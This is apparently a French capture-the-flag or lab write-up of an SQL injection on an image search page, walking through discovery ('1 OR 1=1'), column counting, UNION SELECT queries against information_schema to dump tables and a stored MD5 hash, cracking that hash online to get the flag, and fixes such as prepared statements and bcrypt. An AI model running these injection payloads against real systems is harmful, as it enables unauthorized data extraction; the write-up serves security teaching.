## Phase 1 : Découverte de la faille

En faisant quelques tests sur la page de recherche d'image nous avons pu identifier quíl y avait possiblement une faille liee a de l'injection sql. 

Une comande classique a essayer dans ce cas est : ' OR '1'='1 qui permet d'ajouter des elements de recherche dans la partie where de la commande sql et donc d'afficher tous les utilisateurs.

Ici l'injection est un peu modifiee car la database est geree par MariaDb, 1 OR 1=1

## Phase 2 : Exploitation de la faille

Il est ensuite necessaire de trouver le nombre de colonne dans la table des Members pour la suite des commandes avec :

1 ORDER BY N (N est a remplacer)

On trouve ici 2 colonnes.

On recupere ensuite le nom de la database grace a :

1 union all select 1,database()

On peut ensuite identifier la version du logiciel qui gere la database, ici Mariadb version 5.5.64. Ce qui nous permet d'identifier quelles sont les differentes fonctions que nous allons pouvoir utiliser dans nos requetes pour recuperer des informations importantes. Etant donne que nous sommes sur une version 5.x nous pouvons utiliser la vue information_schema.tables pour recuperer des informations importantes sur la database utilisee ici.

1 union all select 1,version()

Ensuite recuperer le nom de la table utilisee grace a : 1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database(). Ici le nom de la table est list_images


Et ensuite recuperer le nom des colonnes de cette table grace a :
1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x6c6973745f696d61676573 (traduction de list_images en hexa)

Et ensuite recuperer le contenu des colonnes grace a :
1 union all select 1,group_concat(#Nom de la colonne) from list_images

Une des colonnes contient un mdp crypte, la colonne comment. 

Le mot de passe est crypte via la norme md5 qui est particulierement vulnerable si utilisee sans elements complementaires pour hasher des mots de passe. 

Nous allons donc sur un site de decryptage et nous rentrons le mdp suivant : 
1928e8083cf461a51303633093573c46

https://www.cmd5.org/

Une fois celui ci traduit et passe en lowercase nous obtenons albatroz

et en le codant en SH256 nous obtenons le flag :

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Phase 3 : Comment corriger la faille

Ne jamais utiliser d'entree utilisateurs directement dans nos requetes sql.

Utiliser des requettes sql preparees. Par exemple sous python avec sqlite3 :
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

Faire de la validation de donnees dans le back :
Verifie que les donnes sont bien des int et uniquement des int pour un id par exemple. Ou des alphanumeriques pour des identifiants etc.

Fixer des regles strictes sur les noms d'utilisateurs etc afin de faciliter la validation dans le back.

Choisir un meilleur mode de hachage pour les mots de passe. Il est preferable d'utiliser une librairie specialisee comme bcrypt. 